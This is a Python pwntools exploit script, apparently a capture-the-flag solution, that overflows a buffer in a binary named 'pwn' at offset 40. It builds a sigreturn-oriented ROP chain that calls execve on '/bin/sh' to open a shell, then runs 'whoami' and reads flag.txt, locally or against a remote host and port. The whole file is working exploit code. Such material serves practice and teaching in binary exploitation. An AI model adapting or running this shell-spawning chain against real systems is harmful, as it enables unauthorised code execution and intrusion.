#!/usr/bin/python3.7
from pwn import *
import time
import binascii

os.chdir('../public')
elf = context.binary = ELF("pwn")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
init-pwndbg
b *0x40015c
c
'''


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(args.HOST, args.PORT)
    else:
        return process(elf.path)


r = run()
# =-=-=-= GADGETS -=-=-=-
MESSAGE = BINSH = 0x600160  # buffer
rop = ROP(elf)
# pop rax; ret
POP_RAX_RET = rop.find_gadget(['pop rax', 'ret']).address 
# syscall; ret
SYSCALL = rop.find_gadget(['syscall']).address
RET = rop.find_gadget(['ret']).address
OFFSET = 40  # cyclic_find(0x6161616161616166, n=8)

r.recvline()

payload = b'/bin/sh\x00'
payload += b'A' * (OFFSET - len(payload))
payload += p64(POP_RAX_RET)
payload += p64(0xf)
#payload += p64(RET)
payload += p64(SYSCALL)
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = BINSH
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = BINSH

payload += bytes(frame)
r.sendline(payload)
time.sleep(0.1)
r.sendline('whoami')
time.sleep(0.1)
r.sendline('cat flag.txt && echo')
r.interactive()
#print(f'{binascii.hexlify(payload)}')
